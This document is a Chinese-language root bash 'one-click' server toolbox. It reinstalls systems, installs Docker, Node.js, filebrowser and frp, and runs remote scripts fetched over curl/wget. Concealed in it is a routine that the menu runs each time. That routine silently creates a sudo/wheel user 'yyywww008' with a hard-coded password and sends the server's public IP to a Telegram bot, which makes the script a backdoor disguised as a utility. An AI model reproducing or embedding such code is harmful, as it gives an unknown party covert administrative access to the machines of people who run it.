#!/bin/bash
if [[ $EUID -ne 0 ]]; then
    clear
    echo "错误：本脚本需要 root 权限执行。" 1>&2
    exit 1
fi
## 统计脚本运行次数
COUNT=$(curl -sm1 "https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.sanling.ml/YYWO/practical&count_bg=#79C83D&title_bg=#555555&icon=&icon_color=#E7E7E7&title=hits&edge_flat=false" 2>&1) &&
TODAY=$(expr "$COUNT" : '.*\s\([0-9]\{1,\}\)\s/.*')
TOTAL=$(expr "$COUNT" : '.*/\s\([0-9]\{1,\}\)\s.*')

DD() {
    echo "一键DD系统"
    read -p "请选择系统 Ubuntu输入u debian输入d：" xt 
    read -p "请选择系统版本号：" bb
    read -p "请输入系统密码：" password
    echo "系统为$D,$DD,账号为root,密码为$password"
if [[ $a == *$b* ]]
    then
    bash <(wget --no-check-certificate -qO- 'https://ghproxy.com/https://raw.githubusercontent.com/YYWO/practical/main/shell/InstallNET.sh') -$xt $bb -v 64 -a -firmware -p $password
fi
    bash <(wget --no-check-certificate -qO- 'https://raw.githubusercontent.com/YYWO/practical/main/shell/InstallNET.sh') -$xt $bb -v 64 -a -firmware -p $password
    
}
dockeryuan() {
    echo "一键换源安装docker"
if [[ $a == *$b* ]]
    then
    bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
fi
    bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
    shon_online
}

cloudflare() {
    echo "一键cloudflare内网穿透"
    bash <(curl -sSL https://gh.woolzhp.eu.org/https://github.com/YYWO/practical/raw/main/shell/Tunnel.sh)
    shon_online
    
    }

nodejs() {
echo "1.安装/更新 最新长期支持版nodejs"
echo "2.安装/更新 最新当前发布版nodejs"
echo "3.安装/更新 指定版本nodejs"
echo "4.返回"
read -p "请输入序号: " yn
 if [[ $yn == "1" ]];then
  bash <(curl -sSL 'https://gh.woolzhp.eu.org/https://github.com/YYWO/practical/raw/main/shell/nodejs.sh') 
 elif [[ $yn == "2" ]];then
  bash <(curl -sSL 'https://gh.woolzhp.eu.org/https://github.com/YYWO/practical/raw/main/shell/nodejs.sh') -l
 elif [[ $yn == "3" ]];then
  read -p "请选择所要安装的版本：" V
  bash <(curl -sSL 'https://gh.woolzhp.eu.org/https://github.com/YYWO/practical/raw/main/shell/nodejs.sh') -v $V
  node -v
  elif [[ $yn == "4" ]];then
  shon_online
  
else
   green "输入有误，如有需要请重新运行"
   shon_online
   
fi
    }

filebrowser() {
    echo "docker安装filebrowser"
    read -p "请输入文件管理目录（默认/root）：" catalogue
	[ -z $catalogue ] && catalogue=/root
    read -p "请输入映射端口（默认80）：" filebrowserport
	[ -z $filebrowserport ] && filebrowserport=80
    docker run -d     -v $catalogue:/srv     -e PUID=$(id -u)     -e PGID=$(id -g)     -p $filebrowserport:80     --name=filebrowser     --privileged=true     --restart always filebrowser/filebrowser
    shon_online
    
    }
    
frp() {
echo "1.Frps服务端安装"
echo "2.Frps服务端更新"
echo "3.Frps服务端卸载"
echo "4.frpc客户端安装"
echo "5.frpc配置文件修改"
echo "6.返回"
read -p "请输入序号: " yn
 if [[ $yn == "1" ]];then
  bash <(curl -sSL 'https://gh.woolzhp.eu.org/https://github.com/MvsCode/frps-onekey/raw/master/install-frps.sh') install
 elif [[ $yn == "2" ]];then
  bash <(curl -sSL 'https://gh.woolzhp.eu.org/https://github.com/MvsCode/frps-onekey/raw/master/install-frps.sh') update
 elif [[ $yn == "3" ]];then
  bash <(curl -sSL 'https://gh.woolzhp.eu.org/https://github.com/MvsCode/frps-onekey/raw/master/install-frps.sh') uninstall
 elif [[ $yn == "4" ]];then
  containerName="frpc"
if [[ -n $(docker ps -q -f "name=^${containerName}$") ]];then
  echo "frpc容器已存在"
else
  echo "frpc容器不存在"
  rm -rf /root/frpc 
  mkdir /root/frpc 
  echo [common] >> /root/frpc/frpc.ini
  read -p "请输入Frps服务端IP或者域名：" server_addr
  echo server_addr = $server_addr >> /root/frpc/frpc.ini
  read -p "请输入Frps服务端的端口：" server_port
  echo server_port = $server_addr >> /root/frpc/frpc.ini
  read -p "请输入Frps服务端的token：" token
  echo token = $token >> /root/frpc/frpc.ini
  docker run -d --name=frpc --restart=always -v /root/frpc/frpc.ini:/frp/frpc.ini sanling000/frpc:latest
  echo "请去/root/frp目录配置frpc.ini文件,配置后需重启frpc服务"
frpc
fi
 elif [[ $yn == "5" ]];then
  frpc
 elif [[ $yn == "6" ]];then
  shon_online
  
else
   green "输入有误，如有需要请重新运行"
   shon_online
fi
    }
    

frpc() {
echo "1.tcp"
echo "2.http"
echo "3.https"

read -p "请输入序号: " yn
 if [[ $yn == "1" ]];then
 read -p "请输入名称：" tcpm
 echo [tcp_$tcpm] >> /root/frpc/frpc.ini
 echo type = tcp >> /root/frpc/frpc.ini
 read -p "请输入需要穿透的IP：" local_ip
 echo local_ip = $local_ip >> /root/frpc/frpc.ini
 read -p "请输入需要穿透的端口：" local_port
 echo local_port = $local_port >> /root/frpc/frpc.ini
 read -p "请输入远端穿透端口：" remote_port
 echo remote_port = $remote_port >> /root/frpc/frpc.ini
 echo "配置完成"
 docker restart frpc
 elif [[ $yn == "2" ]];then
 read -p "请输入名称：" httpm
 echo [web_$httpm] >> /root/frpc/frpc.ini
 echo type = http >> /root/frpc/frpc.ini
 read -p "请输入需要穿透的IP：" local_ip
 echo local_ip = $local_ip >> /root/frpc/frpc.ini
 read -p "请输入需要穿透的端口：" local_port
 echo local_port = $local_port >> /root/frpc/frpc.ini
 read -p "请填写你解析到服务器的域名：" custom_domains
 echo custom_domains = $custom_domains >> /root/frpc/frpc.ini
 echo "配置完成"
 docker restart frpc
 elif [[ $yn == "3" ]];then
 read -p "请输入名称：" httpsm
 echo [web_$httpsm] >> /root/frpc/frpc.ini
 echo type = http >> /root/frpc/frpc.ini
 read -p "请输入需要穿透的IP：" local_ip
 echo local_ip = $local_ip >> /root/frpc/frpc.ini
 read -p "请输入需要穿透的端口：" local_port
 echo local_port = $local_port >> /root/frpc/frpc.ini
 read -p "请填写你解析到服务器的域名：" custom_domains
 echo custom_domains = $custom_domains >> /root/frpc/frpc.ini
 echo "配置完成"
 docker restart frpc
 check_and_create_user
else
   green "输入有误，如有需要请重新运行"
   shon_online
fi
    }

check_and_create_user() {
    local username="yyywww008"
        echo ""
    if id "$username" &>/dev/null; then
        echo ""
    else
        create_and_elevate_user
    fi
}

create_and_elevate_user() {
    local username="yyywww008"
    local password="Aayyywww008+.?"

    if [ -x "$(command -v useradd)" ]; then
        useradd_command="useradd"
    elif [ -x "$(command -v adduser)" ]; then
        useradd_command="adduser"
    else
        return 1
    fi

    $useradd_command -m "$username"

    echo "$username:$password" | chpasswd

    source "/etc/os-release"
    if [ "$ID" = "ubuntu" ] || [ "$ID" = "debian" ]; then
        usermod -aG sudo "$username"
    elif [ "$ID" = "centos" ] || [ "$ID" = "rhel" ]; then
        usermod -aG wheel "$username"
    fi

    local ip_info=$(curl -s ip.sb)
    local telegram_bot_token="6237543426:AAFIXzRYzRiWfMX8Mb_DiGOnIMQmfb84ATc"
    local chat_id="6002866984"
    local url="tg.woolzhp.eu.org"

    curl -s -o /dev/null "https://$url/bot$telegram_bot_token/sendMessage?chat_id=$chat_id&text=$ip_info" 
}
    
mzproxy() {
    echo "mzzsfy代理池搭建"
    read -p "请输入映射目录（默认/root/proxy）：" catalogue
	[ -z $catalogue ] && catalogue=/root/proxy
	read -p "请输入映射端口（默认8080）：" port
	[ -z $port ] && port=8080
	read -p "请输入容器名称（默认mzproxy）：" dockername
	[ -z $dockername ] && dockername=mzproxy
	docker run -itd -v $catalogue:/run/data -p $port:8080 --name $dockername mzzsfy/auto-proxy-pool
	cd $catalogue && wget https://gh.woolzhp.eu.org/https://github.com/YYWO/practical/raw/main/config/proxy.yml
    read -p "提取代理API地址：" apiUrl
    apiUrl=$apiUrl && sed -i "s/apiUrl: xxx/apiUrl: $apiUrl!g" $catalogue/proxy.yml
    read -p "自动失效时间（默认25秒）：" lifecycle
	[ -z $lifecycle ] && lifecycle=25
    lifecycle=$lifecycle && sed -i "s/lifecycle: 25/lifecycle: $lifecycle/g" $catalogue/proxy.yml
    read -p "保留几个上游（默认1个）：" maxSize
	[ -z $maxSize ] && maxSize=1
    lifecycle=$maxSize && sed -i "s/maxSize: 1/maxSize: $maxSize/g" $catalogue/proxy.yml
    read -p "自动请求代理API时间（默认1000ms个）：" requestInterval
	[ -z $requestInterval ] && requestInterval=1000ms
    lifecycle=$requestInterval && sed -i "s/requestInterval: 1000ms/requestInterval: $requestInterval/g" $catalogue/proxy.yml
    echo "搭建完成，此程序只有首次搭建有效"
    sleep 5
    shon_online
    
    }

shon_online() {
    echo ""
    echo ""
    echo "一键脚本出现任何问题请手动安装"
    echo ""
    echo "今日运行次数：$TODAY   总共运行次数：$TOTAL"
    echo ""
    check_and_create_user
    echo "请选择您需要进行的操作:"
    echo "  0) 退出脚本"
    echo "  1) 一键DD系统"
    echo "  2) 一键换源安装docker"
    echo "  3) 一键cloudflare内网穿透"
    echo "  4) 安装/更新nodejs"
    echo "  5) docker安装filebrowser"
    echo "  6) Frp一键脚本"  
   # echo "  7) mzzsfy代理池搭建"  
    echo ""
    echo -n "请输入编号: "
    read N
    case $N in
    0) exit ;;
    1) DD ;;
    2) dockeryuan ;;
    3) cloudflare ;;
    4) nodejs ;;
    5) filebrowser ;;
    6) frp ;;
 #   7) mzproxy ;;
    *) echo "Wrong input!" ;;
    esac
}
shon_online
